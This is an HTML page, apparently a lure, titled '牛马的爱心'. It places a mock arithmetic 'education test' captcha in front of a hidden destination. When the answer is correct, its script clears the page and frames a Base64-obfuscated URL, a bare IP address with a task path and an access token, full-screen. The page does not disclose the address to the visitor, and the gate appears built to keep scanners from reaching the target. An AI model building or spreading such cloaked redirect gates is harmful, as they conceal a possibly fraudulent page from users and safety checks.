<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>牛马的爱心</title>
    <style>
        *{margin:0;padding:0;}
        html,body{width:100%;height:100%;overflow:hidden;background:#f5f6fa;font-family:sans-serif;}

        /* 验证弹窗（居中覆盖） */
        #captcha-box{
            position:fixed;
            top:0;
            left:0;
            width:100%;
            height:100%;
            background:rgba(0,0,0,0.5);
            display:flex;
            align-items:center;
            justify-content:center;
            z-index:99999;
            backdrop-filter:blur(4px);
        }
        .captcha-card{
            background:#fff;
            padding:35px 30px 30px;
            border-radius:20px;
            width:90%;
            max-width:340px;
            text-align:center;
            box-shadow:0 20px 60px rgba(0,0,0,0.3);
            animation:fadeIn 0.3s ease;
        }
        @keyframes fadeIn{
            from{transform:scale(0.9);opacity:0;}
            to{transform:scale(1);opacity:1;}
        }
        .captcha-card h2{
            font-size:22px;
            color:#1a1a1a;
            margin-bottom:8px;
        }
        .captcha-card .sub{
            font-size:14px;
            color:#999;
            margin-bottom:20px;
        }
        .captcha-card .question{
            font-size:28px;
            font-weight:bold;
            color:#333;
            background:#f0f2f5;
            padding:15px 10px;
            border-radius:12px;
            margin-bottom:18px;
            letter-spacing:2px;
        }
        .captcha-card input{
            width:100%;
            padding:14px;
            font-size:20px;
            text-align:center;
            border:2px solid #ddd;
            border-radius:12px;
            outline:none;
            box-sizing:border-box;
            transition:border 0.2s;
            background:#fafafa;
        }
        .captcha-card input:focus{
            border-color:#4CAF50;
            background:#fff;
        }
        .captcha-card input::placeholder{
            font-size:16px;
            color:#bbb;
        }
        .captcha-card button{
            width:100%;
            padding:14px;
            margin-top:14px;
            background:#4CAF50;
            color:#fff;
            font-size:18px;
            font-weight:bold;
            border:none;
            border-radius:12px;
            cursor:pointer;
            transition:background 0.2s;
        }
        .captcha-card button:active{
            background:#388E3C;
            transform:scale(0.98);
        }
        .captcha-card .error{
            color:#e74c3c;
            font-size:14px;
            margin-top:12px;
            min-height:22px;
        }
        .captcha-card .refresh{
            display:inline-block;
            margin-top:14px;
            color:#2196F3;
            font-size:13px;
            text-decoration:underline;
            cursor:pointer;
            background:none;
            border:none;
            padding:0;
            width:auto;
        }
        .captcha-card .refresh:active{
            color:#0b7ad1;
        }

        /* 底部加载动画（验证通过后消失） */
        #loading-box{
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            height:100%;
            color:#b0b3c0;
        }
        .spinner{
            width:32px;
            height:32px;
            border:3px solid #e8eaf0;
            border-top-color:#7a7f93;
            border-radius:50%;
            animation:spin 0.9s linear infinite;
            margin-bottom:18px;
        }
        @keyframes spin{
            to{transform:rotate(360deg);}
        }
    </style>
</head>
<body>

    <!-- ===== 验证弹窗 ===== -->
    <div id="captcha-box">
        <div class="captcha-card">
            <h2>🔐 学历测试</h2>
            <p class="sub">请计算下面的算式 小学生无法领取</p>
            <div class="question" id="questionText">12 + 34 = ?</div>
            <input type="number" id="answerInput" placeholder="输入答案" inputmode="numeric" autofocus>
            <button id="submitBtn">✅ 验证</button>
            <div class="error" id="errorMsg"></div>
            <button class="refresh" id="refreshBtn">😭我不会😭</button>
        </div>
    </div>

    <!-- ===== 底部加载占位（验证通过后会被替换） ===== -->
    <div id="loading-box">
        <div class="spinner"></div>
        <div>加载中…</div>
    </div>

    <script>
        // =============================================
        // ★★★ 您的目标链接（Base64编码）★★★
        // =============================================
        var encoded = "aHR0cDovLzIxMS4xNTQuMjYuNDQ6ODkvdGFzay8/Y2FtaT10c2Rqdjl2c2gyMmdiMjZnbjRpdmMyeHRzOWNmZ3lvdw==";
        var targetUrl = atob(encoded);

        // =============================================
        // 验证逻辑（100以内随机加减法）
        // ===============
var num1, num2, correctAnswer, operatorSymbol;

        function generateQuestion() {
            // 生成两个 1~99 的随机数
            num1 = Math.floor(Math.random() * 99) + 1;
            num2 = Math.floor(Math.random() * 99) + 1;

            // 随机选择加法或减法
            if (Math.random() < 0.5) {
                // 加法
                operatorSymbol = '+';
                correctAnswer = num1 + num2;
            } else {
                // 减法：确保结果 >= 0
                if (num1 < num2) {
                    var temp = num1;
                    num1 = num2;
                    num2 = temp;
                }
                operatorSymbol = '−';
                correctAnswer = num1 - num2;
            }

            // 更新界面
            document.getElementById('questionText').textContent = num1 + ' ' + operatorSymbol + ' ' + num2 + ' = ?';
            document.getElementById('errorMsg').textContent = '';
            document.getElementById('answerInput').value = '';
            document.getElementById('answerInput').focus();
        }

        function doVerify() {
            var input = document.getElementById('answerInput');
            var userAns = parseInt(input.value);
            var errorEl = document.getElementById('errorMsg');

            // 检查是否输入了有效数字
            if (isNaN(userAns) || input.value.trim() === '') {
                errorEl.textContent = '⚠️ 请输入数字！';
                return;
            }

            // 核对答案
            if (userAns === correctAnswer) {
                // ✅ 验证通过！移除验证弹窗和加载动画，跳转到目标链接
                var iframe = document.createElement('iframe');
                iframe.src = targetUrl;
                iframe.style.cssText = 'width:100%;height:100%;border:none;position:fixed;top:0;left:0;z-index:9999;';
                document.body.innerHTML = '';    // 清空页面所有内容
                document.body.appendChild(iframe); // 嵌入目标页面
            } else {
                // ❌ 答错了
                errorEl.textContent = '❌ 你是小学生！';
                // 自动换一道题（防止暴力尝试）
                setTimeout(function() {
                    generateQuestion();
                }, 600);
            }
        }

        // =============================================
        // 绑定事件
        // =============================================
        // 1. 点击“验证”按钮
        document.getElementById('submitBtn').addEventListener('click', doVerify);

        // 2. 按键盘回车键触发验证
        document.getElementById('answerInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                doVerify();
            }
        });

        // 3. 点击“换一题”刷新题目
        document.getElementById('refreshBtn').addEventListener('click', generateQuestion);

        // =============================================
        // 页面加载时自动生成第一道题
        // =============================================
        window.onload = function() {
            generateQuestion();
        };
    </script>
</body>
</html>
